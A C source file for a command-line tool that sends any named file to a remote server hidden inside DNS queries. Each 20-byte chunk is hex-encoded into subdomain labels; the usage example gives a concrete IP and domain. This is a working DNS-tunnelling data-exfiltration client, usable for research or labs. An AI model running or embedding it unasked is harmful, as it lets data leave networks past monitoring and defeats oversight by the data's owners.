#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <time.h>

#define CHUNK_BYTES 20          // 20 bytes => 40 hex chars (safe under 63-label limit)
#define DNS_PORT 53
#define BUF_SIZE 1500
#define RECV_TIMEOUT_MS 800     // wait for DNS response (ACK-ish)

static void hex_encode(const unsigned char *in, int len, char *out, int out_len) {
    const char *h = "0123456789abcdef";
    if (out_len < len * 2 + 1) return;
    for (int i = 0; i < len; i++) {
        out[2*i]     = h[(in[i] >> 4) & 0xF];
        out[2*i + 1] = h[in[i] & 0xF];
    }
    out[len*2] = '\0';
}

// Minimal DNS query: Header + QNAME + QTYPE + QCLASS
static int build_dns_query(const char *domain, unsigned char *out) {
    memset(out, 0, BUF_SIZE);

    unsigned short id = (unsigned short)(rand() & 0xFFFF);
    out[0] = (id >> 8) & 0xFF;
    out[1] = id & 0xFF;

    // flags: RD=1
    out[2] = 0x01;
    out[3] = 0x00;

    // QDCOUNT=1
    out[4] = 0x00; out[5] = 0x01;

    int offset = 12;

    // QNAME labels
    const char *p = domain;
    while (*p) {
        const char *dot = strchr(p, '.');
        int labellen = dot ? (int)(dot - p) : (int)strlen(p);
        if (labellen <= 0 || labellen > 63) {
            // invalid DNS label length
            return -1;
        }
        out[offset++] = (unsigned char)labellen;
        memcpy(out + offset, p, labellen);
        offset += labellen;
        if (!dot) break;
        p = dot + 1;
    }
    out[offset++] = 0x00; // end QNAME

    // QTYPE=A, QCLASS=IN
    out[offset++] = 0x00; out[offset++] = 0x01;
    out[offset++] = 0x00; out[offset++] = 0x01;

    return offset;
}

static int set_recv_timeout(int sock, int timeout_ms) {
    struct timeval tv;
    tv.tv_sec = timeout_ms / 1000;
    tv.tv_usec = (timeout_ms % 1000) * 1000;
    return setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
}

int main(int argc, char **argv) {
    if (argc < 4) {
        fprintf(stderr, "Usage: %s <server_ip> <domain_suffix> <file>\n", argv[0]);
        fprintf(stderr, "Example: %s 134.199.229.158 happydns.info msg.txt\n", argv[0]);
        return 1;
    }

    const char *server_ip = argv[1];
    const char *suffix    = argv[2];
    const char *filename  = argv[3];

    FILE *fp = fopen(filename, "rb");
    if (!fp) { perror("fopen"); return 1; }

    // Get file size so we can know exactly when we're at the last chunk
    if (fseek(fp, 0, SEEK_END) != 0) {
        perror("fseek");
        fclose(fp);
        return 1;
    }
    long file_size = ftell(fp);
    if (file_size < 0) {
        perror("ftell");
        fclose(fp);
        return 1;
    }
    if (fseek(fp, 0, SEEK_SET) != 0) {
        perror("fseek");
        fclose(fp);
        return 1;
    }

    srand((unsigned)time(NULL));

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) { perror("socket"); fclose(fp); return 1; }

    if (set_recv_timeout(sock, RECV_TIMEOUT_MS) != 0) {
        perror("setsockopt(SO_RCVTIMEO)");
        // not fatal
    }

    struct sockaddr_in server;
    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port   = htons(DNS_PORT);
    if (inet_pton(AF_INET, server_ip, &server.sin_addr) != 1) {
        fprintf(stderr, "Bad server ip\n");
        fclose(fp);
        close(sock);
        return 1;
    }

    unsigned char chunk[CHUNK_BYTES];
    long sent_bytes = 0;
    int seq = 1;

    while (sent_bytes < file_size) {
        int to_read = CHUNK_BYTES;
        if (file_size - sent_bytes < CHUNK_BYTES) {
            to_read = (int)(file_size - sent_bytes);
        }

        int n = (int)fread(chunk, 1, to_read, fp);
        if (n <= 0) break;

        sent_bytes += n;
        int endflag = (sent_bytes == file_size);  // last chunk?

        char hex[CHUNK_BYTES * 2 + 1];
        hex_encode(chunk, n, hex, sizeof(hex));

        char domain[512];
        // d<hex>.i<seq>.e<end>.<suffix>
        snprintf(domain, sizeof(domain), "d%s.i%04d.e%d.%s", hex, seq, endflag, suffix);

        unsigned char pkt[BUF_SIZE];
        int pkt_len = build_dns_query(domain, pkt);
        if (pkt_len < 0) {
            fprintf(stderr, "Invalid domain/label too long: %s\n", domain);
            break;
        }

        int sent = sendto(sock, pkt, pkt_len, 0,
                          (struct sockaddr*)&server, sizeof(server));
        if (sent < 0) { perror("sendto"); break; }

        printf("sent seq=%d end=%d bytes=%d domain=%s\n", seq, endflag, n, domain);

        // Wait for DNS response (acts like an ACK; reduces silent loss)
        unsigned char resp[BUF_SIZE];
        struct sockaddr_in from;
        socklen_t fromlen = sizeof(from);
        int r = recvfrom(sock, resp, sizeof(resp), 0,
                         (struct sockaddr*)&from, &fromlen);
        if (r < 0) {
            // timeout; resend once (simple reliability)
            int resent = sendto(sock, pkt, pkt_len, 0,
                                (struct sockaddr*)&server, sizeof(server));
            if (resent < 0) { perror("resend sendto"); break; }

            r = recvfrom(sock, resp, sizeof(resp), 0,
                         (struct sockaddr*)&from, &fromlen);
            if (r < 0) {
                fprintf(stderr, "WARN: no response for seq=%d\n", seq);
            }
        }

        seq++;
        if (endflag) break;

        // avoid flooding
        usleep(20 * 1000);
    }

    fclose(fp);
    close(sock);
    return 0;
}